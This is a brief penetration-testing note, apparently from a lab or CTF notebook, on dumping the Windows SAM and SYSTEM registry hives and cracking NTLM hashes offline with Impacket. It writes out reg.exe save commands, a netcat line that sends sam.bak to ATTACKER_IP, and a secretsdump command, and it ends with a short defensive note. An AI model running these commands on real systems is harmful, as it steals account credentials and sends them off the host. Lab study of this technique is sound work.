# Windows SAM Hive Dump

Used on: **Wreath**

With sufficient privileges, save the local SAM and SYSTEM registry hives, transfer them to the attacker host, and extract NTLM hashes offline with Impacket.

## When to Use

- Local administrator or backup-style privileges are obtained on a Windows host
- The ability to write files to a temporary directory exists
- A file transfer path is available back to the attacker host

## Prerequisites

- Local administrator or backup-style privileges.
- Ability to write files to a temporary directory.
- File transfer path back to the attacker.

## Dump Hives

```cmd
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

## Transfer with Netcat

On Kali:

```bash
nc -lvnp 4444 > sam.bak
```

On the Windows host:

```cmd
nc-try.exe -w 3 ATTACKER_IP 4444 < C:\Windows\Temp\sam.bak
```

Repeat for `system.bak`.

## Extract Hashes

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

## Defensive Note

Limit local admin access, alert on `reg save HKLM\SAM` / `HKLM\SYSTEM`, and use LAPS/Windows LAPS so local hashes do not reuse privileged credentials across hosts.

## Related

- [mimikatz-sam-pth.md](mimikatz-sam-pth.md)
- [../tools/impacket.md](../../tools/windows/impacket.md)
- [../tools/netcat.md](../../tools/pivot/netcat.md)


